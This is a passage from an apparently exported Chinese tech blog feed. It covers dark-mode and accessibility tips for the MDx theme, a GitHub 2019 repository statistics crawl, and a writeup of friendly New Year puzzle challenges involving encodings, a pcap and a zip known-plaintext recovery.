wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" 